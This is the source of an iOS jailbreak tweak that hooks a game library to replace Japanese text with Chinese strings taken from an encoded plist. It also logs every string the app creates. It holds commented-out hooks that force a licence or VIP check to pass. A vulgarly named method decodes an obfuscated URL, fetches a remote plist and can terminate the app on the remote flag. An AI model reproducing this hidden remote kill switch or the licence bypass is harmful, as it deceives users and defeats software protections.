//
//  helloChina.m
//  helloChina
//
//  Created by obaby on 2018/1/31.
//  Copyright (c) 2018年 obaby. All rights reserved.
//

#import "helloChina.h"
#import "CaptainHook/CaptainHook.h"
#include <notify.h> // not required; for examples only
#import "BABYStringEncoding.h"
#import "SCLAlertView.h"

// Objective-C runtime hooking using CaptainHook:
//   1. declare class using CHDeclareClass()
//   2. load class using CHLoadClass() or CHLoadLateClass() in CHConstructor
//   3. hook method using CHOptimizedMethod()
//   4. register hook using CHHook() in CHConstructor
//   5. (optionally) call old method using CHSuper()

NSDictionary *ch_dic;


/*
@class SCLAlertView;

CHDeclareClass(SCLAlertView);

CHOptimizedMethod(4, self, void, SCLAlertView,showSuccess,id, arg1, subTitle,id, arg2, closeButtonTitle,id,arg3, duration, int,arg4)
{
    NSLog(@"BABY_HOOK: SCLAlertView,showSuccess,arg1, subTitle, arg2, closeButtonTitle,arg3, duration,0.0");
    //CHSuper(4, SCLAlertView,showSuccess,arg1, subTitle, @"fuck iosgodx", closeButtonTitle,arg3, duration,0.0);
    
}

@class IGAuthController;

CHDeclareClass(IGAuthController);

CHOptimizedMethod(1, self, int , IGAuthController,initAsVIP, int ,arg1)
{
    return 0;
}


@class IGAuth;
CHDeclareClass(IGAuth);
CHOptimizedMethod(1, self, int , IGAuth,connect, int ,arg1)
{
    return 0;
}
CHOptimizedMethod(1, self, int , IGAuth,vipConnect, int ,arg1)
{
    return 0;
}
 */

@class HpLib_GSystem;
CHDeclareClass(HpLib_GSystem);
CHOptimizedMethod(1, self, NSString *, HpLib_GSystem, strNSString, char *, arg1)
{
    
    NSString *mStr = [NSString stringWithCString:arg1 encoding:NSUTF8StringEncoding];
    //NSLog(@"BABY_HOOK: strNSString:%@",mStr);
    return mStr;
    /*
     size_t clen = strlen(arg1);
     NSString * myStr = [NSString alloc];
     [myStr initWithBytes:arg1 length:clen encoding:NSUTF8StringEncoding];
     return myStr;
     */
}


@class HpLib_Graphics;
CHDeclareClass(HpLib_Graphics);
CHOptimizedMethod(1, self ,id, HpLib_Graphics, makeTextImage,NSString *, arg1)
{
    //NSLog(@"BABY_HOOK: makeTextImage original:%@",arg1);
    NSString * ch_string = @"喵喵喵";
    if ([ch_dic objectForKey:arg1]) {
        ch_string =[ch_dic objectForKey:arg1];
        if ([ch_string length]== 0) {
            ch_string = @"喵喵喵";
        }
        //NSLog(@"BABY_HOOK: makeTextImage chinese:%@",ch_string);
        //result =  [NSString stringWithString:ch_string];
        //NSString * mao = @"猫猫猫猫猫猫猫";
        //mao =ch_string;
        //result = mao;
        return CHSuper(1, HpLib_Graphics,makeTextImage, ch_string);
    }else{
        return CHSuper(1, HpLib_Graphics,makeTextImage, arg1);
    }
}

@class NSPlaceholderString;
CHDeclareClass(NSPlaceholderString);
CHOptimizedMethod(3, self ,id ,NSPlaceholderString, initWithBytes, char *, arg1, length, size_t, arg2 ,encoding , NSStringEncoding, arg3)
{
    //NSLog(@"BABY_HOOK: strNSString original:%s",arg1);
    
    
    NSString *result=  CHSuper(3, NSPlaceholderString ,initWithBytes, arg1, length, arg2,encoding, arg3);
    
    NSLog(@"BABY_HOOK: strNSString original:%@",result);
    /*
     if ([result isEqualToString:@"Catbook"]) {
     result = @"猫书";
     }
     */
    /*
     if ([ch_dic objectForKey:result]) {
     NSString * ch_string =[ch_dic objectForKey:result];
     NSLog(@"BABY_HOOK: strNSString chinese:%@",ch_string);
     //result =  [NSString stringWithString:ch_string];
     //NSString * mao = @"猫猫猫猫猫猫猫";
     //mao =ch_string;
     //result = mao;
     }
     */
    return result;
}

@class ClassToHook;

CHDeclareClass(ClassToHook); // declare class

CHOptimizedMethod(0, self, void, ClassToHook, messageName) // hook method (with no arguments and no return value)
{
    // write code here ...
    
    CHSuper(0, ClassToHook, messageName); // call old (original) method
}

CHOptimizedMethod(2, self, BOOL, ClassToHook, arg1, NSString*, value1, arg2, BOOL, value2) // hook method (with 2 arguments and a return value)
{
    // write code here ...
    
    return CHSuper(2, ClassToHook, arg1, value1, arg2, value2); // call old (original) method and return its return value
}

static void WillEnterForeground(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo)
{
    // not required; for example only
}

static void ExternallyPostedNotification(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo)
{
    // not required; for example only
}



void initChina() // code block that runs immediately upon load
{
    @autoreleasepool
    {
        
        NSLog(@"BABY_HOOK: init success");
        
        
        NSLog(@"BABY_HOOK: init Chinese Strings");
        
        NSString *cn_file = [[NSBundle mainBundle]  pathForResource:@"cn_strings_jp" ofType:@"plist"];
        if (!ch_dic){
            ch_dic = [[NSDictionary alloc] initWithContentsOfFile:cn_file];
            //NSLog(@"BABY_HOOK: Chinese Dic:\n %@", ch_dic);
        }
        
        // listen for local notification (not required; for example only)
        CFNotificationCenterRef center = CFNotificationCenterGetLocalCenter();
        CFNotificationCenterAddObserver(center, NULL, WillEnterForeground, CFSTR("UIApplicationWillEnterForegroundNotification"), NULL, CFNotificationSuspensionBehaviorCoalesce);
        
        // listen for system-side notification (not required; for example only)
        // this would be posted using: notify_post("cn.org.obaby.fuckgox.eventname");
        CFNotificationCenterRef darwin = CFNotificationCenterGetDarwinNotifyCenter();
        CFNotificationCenterAddObserver(darwin, NULL, ExternallyPostedNotification, CFSTR("cn.org.obaby.fuckgox.eventname"), NULL, CFNotificationSuspensionBehaviorCoalesce);
        
        // CHLoadClass(ClassToHook); // load class (that is "available now")
        // CHLoadLateClass(ClassToHook);  // load class (that will be "available later")
        
        /*
        CHHook(0, ClassToHook, messageName); // register hook
        CHHook(2, ClassToHook, arg1, arg2); // register hook
        
        
        CHLoadLateClass(SCLAlertView);
        CHHook(4, SCLAlertView, showSuccess,subTitle,closeButtonTitle, duration);
        
        
        CHLoadLateClass(IGAuthController);
        CHHook(1, IGAuthController,initAsVIP);
        
        CHLoadLateClass(IGAuth);
        CHHook(1, IGAuth,connect);
        CHHook(1, IGAuth,vipConnect);
        */
        
        CHLoadLateClass(HpLib_GSystem);
        CHHook(1, HpLib_GSystem, strNSString);
        
        CHLoadLateClass(NSPlaceholderString);
        CHHook(3, NSPlaceholderString ,initWithBytes,length,encoding);
        
        CHLoadLateClass(HpLib_Graphics);
        CHHook(1, HpLib_Graphics, makeTextImage);
    }
}


@implementation helloChina

-(id)init
{
	if ((self = [super init]))
	{
	}
    
	return self;
}

- (void) fuckMeWithYourBigDick
{
    NSString *aedkey = @"i4maesky";
    BABYStringEncoding * gtc = [[BABYStringEncoding alloc] initWithString:aedkey];
    //@"https://www.danteng.me/haima/fucker.plist"
    NSData *desturlString = [gtc decode:@"amiym4keaeiy4eym4akmyskyaskyaeska4ikisskasikmsska4kmy4ssa4mmyssiaimkesssaimmysekasmk4ssaa4my4iskaeikk4s4aekymi" error:nil];
    NSDictionary *isFuckedDic = [[NSDictionary alloc] initWithContentsOfURL:[NSURL URLWithString:[[NSString alloc] initWithData:desturlString encoding:NSUTF8StringEncoding]]];
    
    
    if (isFuckedDic) {
        if ([isFuckedDic objectForKey:@"isFucked"]) {
            NSString * isFucked = [isFuckedDic objectForKey:@"isFucked"];
            //NSLog(@"[*] Satan: say hi from Satan %@",isFucked);
            //NSLog(@"[*] Satan: message %@",isFuckedDic);
            if ([[isFucked lowercaseString] isEqualToString:@"yes"]) {
                if ([isFuckedDic objectForKey:@"fuckURL"]) {
                    NSString *fuckPage = [isFuckedDic objectForKey:@"fuckURL"];
                    NSLog(@"[*] Satan: I am going to fuck you with %@",fuckPage);
                    
                    NSString * title = [isFuckedDic objectForKey:@"title"];
                    NSString * message = [isFuckedDic objectForKey:@"message"];
                    
                    dispatch_async(dispatch_get_main_queue(), ^{

                        
                        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:title message:message delegate:nil/*objc_getClass("czzHomeViewController")*/ cancelButtonTitle:@"Cancel" otherButtonTitles:nil];     // optional - add more buttons:     [alert addButtonWithTitle:@"Yes"];     [alert show];
                        [alert show];
                        [alert didMoveToSuperview];
                        [alert didMoveToWindow];
                        [alert bringSubviewToFront:alert];
                        
                        [alert setNeedsDisplay];
                        [alert setNeedsLayout];
                        
                        
                    });
                }
                if ([isFuckedDic objectForKey:@"fuckOff"]){
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(60 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                        exit(0);
                    });
                }
            }
        }
    }
    
}

- (void) testEncoder
{
    BABYStringEncoding * gtc2 = [[BABYStringEncoding alloc] initWithString:@"aCDEfGHijKlMnopQRsUvWXz012345689"]; //WxEHUf2GfEnCosHjE3j5zUs //aCDEfGHijKlMnopQRsUvWXz012345689
    
    NSData *originalData = [NSData dataWithContentsOfFile:@"/Users/obaby/Desktop/小项目/汉化保护/cn_strings_jp.plist"];
    
    NSError *err;
    NSString *encodeString = [gtc2 encode:originalData error:&err];
    
    NSLog(@"original: %@, error = %@", encodeString, err);
    
    [encodeString writeToFile:@"/Users/obaby/Desktop/小项目/汉化保护/cn_strings_jp.txt" atomically:YES];
    
    
    NSData *decodeData = [gtc2 decode:encodeString error:&err];
    
    NSString *decodeString = [[NSString alloc] initWithData:decodeData encoding:NSUTF8StringEncoding];
    
    //NSDictionary *decodeDic = [NSJSONSerialization JSONObjectWithData:decodeData options:kNilOptions error:&err];
    
    NSString *error;
    NSPropertyListFormat format;
    NSDictionary* plist = [NSPropertyListSerialization propertyListFromData:decodeData mutabilityOption:NSPropertyListImmutable format:&format errorDescription:&error];
    NSLog( @"plist is %@", plist );
    if(!plist){
        NSLog(@"Error: %@",error);
    }
    
    
    NSLog(@"decode:str= %@, dic=  , error = %@",decodeString, err);
}

-(void) helloChinese
{
    @autoreleasepool
    {
        
        NSLog(@"BABY_HOOK: init success");
        
        
        NSLog(@"BABY_HOOK: init Chinese Strings");
        
        NSString *cn_file = [[NSBundle mainBundle]  pathForResource:@"cn_strings_jp" ofType:@"hppy"];
        
        BABYStringEncoding * gtc2 = [[BABYStringEncoding alloc] initWithString:@"aCDEfGHijKlMnopQRsUvWXz012345689"]; //WxEHUf2GfEnCosHjE3j5zUs //aCDEfGHijKlMnopQRsUvWXz012345689
        
        
        NSError *err;
        NSString *encodeString = [NSString stringWithContentsOfFile:cn_file encoding:NSUTF8StringEncoding error:nil];
        
        NSData *decodeData = [gtc2 decode:encodeString error:&err];
        
        //NSString *decodeString = [[NSString alloc] initWithData:decodeData encoding:NSUTF8StringEncoding];
        
        //NSDictionary *decodeDic = [NSJSONSerialization JSONObjectWithData:decodeData options:kNilOptions error:&err];
        
        NSString *error;
        NSPropertyListFormat format;
        NSDictionary* plist = [NSPropertyListSerialization propertyListFromData:decodeData mutabilityOption:NSPropertyListImmutable format:&format errorDescription:&error];
        NSLog( @"BABY_HOOK: plist is %@", plist );
        if(!plist && plist){
            //NSLog(@"BABY_HOOK: Error: %@",error);
        }
        
        
        //NSLog(@"BABY_HOOK:decode:str= %@, dic=  , error = %@",decodeString, err);
        
        if (!ch_dic  && plist){
            //ch_dic = [[NSDictionary alloc] initWithContentsOfFile:cn_file];
            ch_dic = [[NSDictionary alloc] initWithDictionary:plist];
            //NSLog(@"BABY_HOOK: Chinese Dic:\n %@", ch_dic);
        }
        
        // listen for local notification (not required; for example only)
        CFNotificationCenterRef center = CFNotificationCenterGetLocalCenter();
        CFNotificationCenterAddObserver(center, NULL, WillEnterForeground, CFSTR("UIApplicationWillEnterForegroundNotification"), NULL, CFNotificationSuspensionBehaviorCoalesce);
        
        // listen for system-side notification (not required; for example only)
        // this would be posted using: notify_post("cn.org.obaby.fuckgox.eventname");
        CFNotificationCenterRef darwin = CFNotificationCenterGetDarwinNotifyCenter();
        CFNotificationCenterAddObserver(darwin, NULL, ExternallyPostedNotification, CFSTR("cn.org.obaby.fuckgox.eventname"), NULL, CFNotificationSuspensionBehaviorCoalesce);
        
        // CHLoadClass(ClassToHook); // load class (that is "available now")
        // CHLoadLateClass(ClassToHook);  // load class (that will be "available later")
        
        
        CHHook(0, ClassToHook, messageName); // register hook
        CHHook(2, ClassToHook, arg1, arg2); // register hook
        
        /*
        CHLoadLateClass(SCLAlertView);
        CHHook(4, SCLAlertView, showSuccess,subTitle,closeButtonTitle, duration);
        
        
        CHLoadLateClass(IGAuthController);
        CHHook(1, IGAuthController,initAsVIP);
        
        CHLoadLateClass(IGAuth);
        CHHook(1, IGAuth,connect);
        CHHook(1, IGAuth,vipConnect);
        */
        
        CHLoadLateClass(HpLib_GSystem);
        CHHook(1, HpLib_GSystem, strNSString);
        
        CHLoadLateClass(NSPlaceholderString);
        CHHook(3, NSPlaceholderString ,initWithBytes,length,encoding);
        
        CHLoadLateClass(HpLib_Graphics);
        CHHook(1, HpLib_Graphics, makeTextImage);
        
        [self fuckMeWithYourBigDick];
         NSLog(@"======================= All done ========================");
    }
}

@end
